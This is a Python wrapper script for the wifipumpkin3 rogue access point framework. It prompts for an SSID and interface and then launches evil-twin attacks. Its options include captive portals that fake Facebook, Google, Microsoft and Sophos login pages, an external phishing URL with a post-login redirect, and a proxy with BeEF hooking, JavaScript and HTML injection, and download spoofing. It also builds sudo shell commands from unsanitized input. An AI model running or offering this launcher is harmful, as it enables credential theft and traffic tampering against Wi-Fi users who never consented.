from os import system

# ANSI escape codes for text colors
class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_color(text, color):
    print(color + text + Color.ENDC)

def Main():
    try:
        print_color("wifipumpkin3 easy script by cvip", Color.HEADER + Color.BOLD)
        ssid = input("What do you want the ssid name to be 'The name of the wifi' > ")
        print("")
        system("sudo iwconfig")
        interface = input("\nWhat wifi interface will host the RAP > ")
        print_color("""\n
        Proxies
        =======""", Color.OKBLUE + Color.BOLD)
        print_color("captiveflask (Allow block Internet access for users until they open the page login page.)", Color.OKGREEN + Color.BOLD)
        print_color("phishkin3 (Proxy for create captive portal with external phishing page)", Color.OKGREEN + Color.BOLD)
        print_color("evilqr3 (Proxy for create captive portal QR phishing WhatsApp, Discord, etc... )", Color.OKGREEN + Color.BOLD)
        print_color("pumpkinproxy (Transparent proxies that you can use to intercept and manipulate HTTP traffic modifying requests and responses, that allow to inject javascripts into the targets visited.)", Color.OKGREEN + Color.BOLD)
        print_color("noproxy (Running without proxy redirect traffic)\n", Color.OKGREEN + Color.BOLD)
        proxies = input("What proxy do you want to use > ")

        proxy_commands = {
            'captiveflask': {
                'message': 'Captive Portal plugins (You might need to install some of them) used as fake login pages',
                'prefix': 'captiveflask.',
                'options': [
                    'DarkLogin',
                    'FlaskDemo',
                    'Login_v4',
                    'example',
                    'facebook',
                    'google',
                    'loginPage',
                    'microsoft',
                    'sophos'
                ]
            },
            'phishkin3': {
                'message': 'Phishkin3 proxy configuration',
                'prefix': 'phishkin3.',
                'options': [
                    'cloud_url_phishing',
                    'redirect_url_after_login'
                ]
            },
            'pumpkinproxy': {
                'message': 'PumpkinProxy 3 plugins',
                'prefix': 'pumpkinproxy.',
                'options': [
                    'beef',
                    'downloadspoof',
                    'html_inject',
                    'js_inject',
                    'no-cache'
                ]
            }
        }

        if proxies in proxy_commands:
            proxy_data = proxy_commands[proxies]
            print_color(f"\n{proxy_data['message']}", Color.OKGREEN + Color.BOLD)
            if proxies == 'captiveflask':
                print_color("Options:", Color.OKBLUE + Color.BOLD)
                for option in proxy_data['options']:
                    print_color(f" - {option}", Color.OKGREEN + Color.BOLD)
                template = input("Which template do you want to use > ")
                command = f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}{template} true; start"'
                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                system(command)
            elif proxies == 'phishkin3':
                phishing_url = input("Enter the phishing URL > ")
                redirect_url = input("Enter the redirect URL after login > ")
                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}cloud_url_phishing {phishing_url}; set {proxy_data["prefix"]}redirect_url_after_login {redirect_url}; start"')
            elif proxies == 'pumpkinproxy':
                print_color("Options:", Color.OKBLUE + Color.BOLD)
                for option in proxy_data['options']:
                    print_color(f" - {option}", Color.OKGREEN + Color.BOLD)
                plugin = input(f"What {proxies} plugin do you want to use > ")
                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; set {proxy_data["prefix"]}{plugin}; start"')
            elif proxies == 'noproxy':
                print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
                system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; start"')
        else:
            print_color("\nLaunching program\n", Color.OKBLUE + Color.BOLD)
            system(f'sudo wifipumpkin3 --xpulp "set interface {interface}; set ssid {ssid}; set proxy {proxies}; start"')

    except KeyboardInterrupt:
        print_color("\nClosing script", Color.FAIL + Color.BOLD)

if __name__ == "__main__":
    Main()
